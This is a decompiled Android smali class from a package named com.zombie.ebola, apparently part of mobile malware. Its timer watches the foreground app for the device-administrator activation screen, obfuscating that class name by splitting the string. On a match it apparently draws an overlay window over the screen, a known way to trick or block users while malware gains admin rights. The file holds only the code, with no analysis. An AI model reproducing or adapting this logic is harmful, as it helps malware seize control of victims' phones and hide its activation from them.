.class Lcom/zombie/ebola/y;
.super Landroid/os/CountDownTimer;


# instance fields
.field final synthetic a:Lcom/zombie/ebola/x;


# direct methods
.method constructor <init>(Lcom/zombie/ebola/x;JJ)V
    .locals 0

    iput-object p1, p0, Lcom/zombie/ebola/y;->a:Lcom/zombie/ebola/x;

    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 3

    iget-object v0, p0, Lcom/zombie/ebola/y;->a:Lcom/zombie/ebola/x;

    invoke-static {v0}, Lcom/zombie/ebola/x;->a(Lcom/zombie/ebola/x;)Lcom/zombie/ebola/w;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/w;->a(Lcom/zombie/ebola/w;)Lcom/zombie/ebola/v;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    const-string v1, "activity"

    invoke-virtual {v0, v1}, Lcom/zombie/ebola/zero;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    const/4 v1, 0x0

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v0, v0, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    const-string v1, "Devi"

    const-string v2, "ceAdminAdd"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/zombie/ebola/y;->a:Lcom/zombie/ebola/x;

    invoke-static {v0}, Lcom/zombie/ebola/x;->a(Lcom/zombie/ebola/x;)Lcom/zombie/ebola/w;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/w;->a(Lcom/zombie/ebola/w;)Lcom/zombie/ebola/v;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    iget-object v1, p0, Lcom/zombie/ebola/y;->a:Lcom/zombie/ebola/x;

    invoke-static {v1}, Lcom/zombie/ebola/x;->a(Lcom/zombie/ebola/x;)Lcom/zombie/ebola/w;

    move-result-object v1

    invoke-static {v1}, Lcom/zombie/ebola/w;->a(Lcom/zombie/ebola/w;)Lcom/zombie/ebola/v;

    move-result-object v1

    invoke-static {v1}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v1

    iget-object v1, v1, Lcom/zombie/ebola/u;->a:Landroid/view/WindowManager;

    iget-object v2, p0, Lcom/zombie/ebola/y;->a:Lcom/zombie/ebola/x;

    invoke-static {v2}, Lcom/zombie/ebola/x;->a(Lcom/zombie/ebola/x;)Lcom/zombie/ebola/w;

    move-result-object v2

    invoke-static {v2}, Lcom/zombie/ebola/w;->a(Lcom/zombie/ebola/w;)Lcom/zombie/ebola/v;

    move-result-object v2

    invoke-static {v2}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v2

    iget-object v2, v2, Lcom/zombie/ebola/u;->b:Landroid/view/View;

    invoke-static {v0, v1, v2}, Lcom/zombie/ebola/u;->a(Lcom/zombie/ebola/u;Landroid/view/WindowManager;Landroid/view/View;)V

    :goto_0
    return-void

    :cond_0
    invoke-virtual {p0}, Lcom/zombie/ebola/y;->start()Landroid/os/CountDownTimer;

    goto :goto_0
.end method

.method public onTick(J)V
    .locals 0

    return-void
.end method
